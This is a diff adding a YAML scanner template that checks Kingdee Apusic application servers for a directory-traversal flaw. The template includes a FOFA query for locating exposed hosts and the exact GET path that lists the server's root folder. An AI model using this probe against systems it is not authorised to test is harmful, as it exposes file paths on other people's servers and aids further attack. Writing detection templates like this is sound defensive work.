@@ -1,0 +1,22 @@
+id: kingdee-oa-apusic-server-file-traversal
+
+info:
+  name: 金蝶OA Apusic应用服务器(中间件) server_file 目录遍历
+  author: zan8in
+  severity: low
+  verified: true
+  description: |-
+    金蝶Apusic应用服务器是国内第一个通过J2EE测试认证的应用服务器，全球第四家获得JavaEE 5.0认证授权的产品，完全实现J2EE等企业计算相关的工业规范及标准代码简洁优化，具备了数据持久性、事务完整性、消息传输的可靠性、集群功能的高可用性、以及跨平台的支持等特点。金蝶Apusic应用服务器 server_file处存在目录遍历漏洞，攻击者可以从其中获取网站路径等敏感信息进一步攻击。
+    fofa: app="Apusic-公司产品" && title=="欢迎使用Apusic应用服务器"
+  reference:
+    - https://mp.weixin.qq.com/s/ZTZ0XPOtSZn0Mg_ZSA1L6Q
+  tags: kingdee,directory-traversal
+  created: 2023/10/13
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /admin/protected/selector/server_file/files?folder=/
+    expression: response.status==200 && response.body.bcontains(b'"total":') && response.body.bcontains(b'"rows":') && response.body.bcontains(b'"name":') && response.body.bcontains(b'"path":') && response.body.bcontains(b'"folder":')
+expression: r0()
